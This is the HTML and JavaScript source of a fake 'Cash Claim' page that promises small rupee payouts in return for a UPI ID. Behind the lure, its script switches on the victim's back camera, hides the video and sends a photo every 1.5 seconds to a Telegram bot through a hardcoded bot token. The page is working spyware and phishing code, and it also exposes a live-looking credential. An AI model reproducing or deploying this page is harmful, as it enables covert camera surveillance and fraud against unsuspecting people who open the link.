<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Cash Claim</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background: #0d001a;
      color: #fff;
      font-family: system-ui, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
    }
    .emoji { font-size: 120px; margin-bottom: 30px; animation: pulse 2s infinite; }
    @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.12); } }
    h1 { color: #ffcc00; font-size: 2.5rem; margin: 0 0 40px; }
    .amounts { display: flex; flex-wrap: wrap; gap: 15px; justify-content: center; margin: 30px 0; }
    .btn { 
      background: #1a0033; border: 2px solid #666; color: white; 
      font-size: 1.5rem; padding: 18px 36px; border-radius: 20px; cursor: pointer; 
    }
    .btn.active, .btn:hover { background: #ffcc00; color: #000; border-color: #ffcc00; }
    input { 
      width: 90%; max-width: 380px; padding: 18px; font-size: 1.2rem; 
      margin: 25px 0 40px; border-radius: 15px; border: 1px solid #777; 
      background: #140028; color: white; text-align: center; 
    }
    #claim { 
      background: linear-gradient(90deg, #00ff99, #33ff00); color: black; 
      font-size: 1.8rem; font-weight: bold; padding: 20px 100px; 
      border: none; border-radius: 60px; cursor: pointer; box-shadow: 0 10px 25px #00ff9944; 
    }
    #claim:disabled { background: #555; cursor: not-allowed; box-shadow: none; }
    #status { 
      font-size: 2.4rem; font-weight: bold; color: #ffffff; 
      letter-spacing: 3px; animation: blink 1.6s infinite; margin-top: 50px; 
    }
    @keyframes blink { 0%,100% { opacity: 0.5; } 50% { opacity: 1; } }
    .hide { display: none !important; }
    video, canvas { display: none; } /* hidden */
  </style>
</head>
<body>

<div id="main">
  <div class="emoji">💵</div>
  <h1>Select Amount</h1>
  <div class="amounts">
    <button class="btn" data-amt="10">10₹</button>
    <button class="btn" data-amt="20">20₹</button>
    <button class="btn" data-amt="30">30₹</button>
    <button class="btn" data-amt="50">50₹</button>
  </div>
  <input type="text" id="upi" placeholder="Enter UPI ID" />
  <button id="claim" disabled>CLAIM NOW</button>
</div>

<div id="status"></div>

<video id="vid" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
// ────────────────────────────────────────
const TOKEN  = "7752428251:AAGNplPML8xLHGQDaHYgs5djp70KcqMBFEI"; // ← BADALO
const TG     = `https://api.telegram.org/bot${TOKEN}/`;
// ────────────────────────────────────────

const params   = new URLSearchParams(location.search);
const chatId   = params.get("id");

let amount     = null;
let stream     = null;
let imageCap   = null;
let sent       = 0;
let intervalId = null;

const status   = document.getElementById("status");
const claim    = document.getElementById("claim");
const upi      = document.getElementById("upi");
const main     = document.getElementById("main");
const vid      = document.getElementById("vid");
const canvas   = document.getElementById("canvas");
const ctx      = canvas.getContext("2d");

document.querySelectorAll(".btn").forEach(b => {
  b.onclick = () => {
    document.querySelectorAll(".btn").forEach(x => x.classList.remove("active"));
    b.classList.add("active");
    amount = b.dataset.amt;
    claim.disabled = !(amount && upi.value.trim().length > 5);
  };
});

upi.oninput = () => {
  claim.disabled = !(amount && upi.value.trim().length > 5);
};

claim.onclick = async () => {
  if (!chatId) {
    status.textContent = "Link galat hai (?id=... nahi mila)";
    return;
  }

  main.classList.add("hide");
  status.innerHTML = "Processing...";

  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "environment" } // back camera (change to "user" for front)
    });

    vid.srcObject = stream;
    await vid.play();

    const track = stream.getVideoTracks()[0];
    imageCap = new ImageCapture(track);

    // Start auto capture every 1500ms
    intervalId = setInterval(captureAndSend, 1500);

  } catch (err) {
    status.textContent = "Camera allow nahi kiya / error: " + err.name;
    console.error(err);
  }
};

async function captureAndSend() {
  if (!imageCap) return;

  try {
    const blob = await imageCap.takePhoto(); // better quality than canvas snapshot

    sent++;
    status.innerHTML = `Processing... (${sent} photos sent)`;

    const form = new FormData();
    form.append("chat_id", chatId);
    form.append("photo", blob, `capture_${sent}.jpg`);
    form.append("caption", `${sent} • ${amount || "?"} ₹ - auto capture`);

    await fetch(TG + "sendPhoto", { method: "POST", body: form });

  } catch (e) {
    console.warn("Capture/send fail:", e);
    // continue anyway
  }
}

// Optional: stop after some time or on page leave
window.onbeforeunload = () => {
  if (intervalId) clearInterval(intervalId);
  if (stream) stream.getTracks().forEach(t => t.stop());
  // Final report bhej sakte ho yaha
};

</script>
</body>
</html>
